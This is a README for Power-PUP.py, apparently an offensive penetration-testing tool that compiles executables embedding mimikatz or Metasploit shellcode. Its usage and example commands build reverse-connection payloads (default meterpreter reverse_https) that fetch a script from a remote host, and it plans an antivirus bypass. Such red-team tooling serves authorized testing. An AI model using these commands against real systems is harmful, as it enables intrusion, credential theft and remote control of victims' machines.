## Powershell Universal Programmer
### (Power-PUP.py)
Powershell Universal Programmer (Power-PUP.py) is a Windows Python script to compile Windows System.Management.Automation for a powershell alternative.


#### USAGE:
```sh
Powershell Universal Programmer

Usage: Power-PUP.py -a target_architecture
-a | --arch                - architecture of the target host
-o | --output              - executable output name
-m | --mimi                - Create a mimikatz executable
-s | --shellcode           - Create a shellcode executable
-d | --hostserver          - PS script host location
-l | --lhost               - Host listening for reverse connections
                               Default: 127.0.0.1
-p | --lport               - Port listening for reverse connections
                               Default: 443
-t | --payload             - Metasploit payload to utilize
                               Default: windows/meterpreter/reverse_https

```

#### Examples: 
* ```Power-PUP.py -a x86```
* ```Power-PUP.py -a x64 -o psx64.exe```
* ```Power-PUP.py -a x64 -m -d http://192.168.1.1/im.txt```
* ```Power-PUP.py -a x64 -s -d http://192.168.1.1/im.txt --lhost 192.168.1.1 --lport 443```

#### Info:
```sh
#---------------------------------------------------------------#
#!/bin/python2                                                  #
#-Metadata------------------------------------------------------#
#  Released: 2016-07-26                                         #
#  Updated: 2016-07-31                                          #
#                                                               #
#-Info----------------------------------------------------------#
#  Powershell Universal Programmer (Power-PUP.py) is a Windows  #
#    Python script to compile Windows                           #
#    System.Management.Automation for a powershell alternative. #
#                                                               #
#-Author(s)-----------------------------------------------------#
#  Joseph Barcia                    - github.com/jbarcia        #
#  Scott Bernstein (Feel the Bern?) - github.com/scott-be       #
#                                                               #
#-Operating System----------------------------------------------#
#  Designed for: Windows 7+ running .Net Framework 4.5+         #
#     Tested on: Windows 7 running .Net Framework 4.5           #
#                                                               #
#-Licence-------------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT             #
#                                                               #
#-Notes---------------------------------------------------------#
#  USAGE                                                        #
#  Powershell Universal Programmer (Power-PUP.py)               #
#                                                               #
#  Usage: Power-PUP.py -a target_architecture                   #
#  -a | --arch        - architecture of the target host         #
#  -o | --output      - executable output name                  #
#  -m | --mimi        - Create a mimikatz executable            #
#  -s | --shellcode   - Create a shellcode executable           #
#  -d | --hostserver  - PS script host location                 #
#  -l | --lhost       - Host listening for reverse connections  #
#                     Default: 127.0.0.1                        #
#  -p | --lport       - Port listening for reverse connections  #
#                     Default: 443                              #
#  -t | --payload     - Metasploit payload to utilize           #
#                     Default: windows/meterpreter/reverse_https#
#                                                               #
#                                                               #
# Examples:                                                     #
#                                                               #
# Power-PUP.py -a x86                                           #
# Power-PUP.py -a x64 -o psx64.exe                              #
# Power-PUP.py -a x64 -m -d http://192.168.1.1/im.txt           #
# Power-PUP.py -a x64 -s -d http://192.168.1.1/im.txt           #
#                              --lhost 192.168.1.1 --lport 443  #
#                                                               #
#-Future Additions----------------------------------------------#
#  - Detect .Net Version                                        #
#       HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\                  #
#       NET Framework Setup\NDP\v4\Full\InstallPath             #
#  - A/V XOR bypass                                             #
#                                                               #
#---------------------------------------------------------------#

```
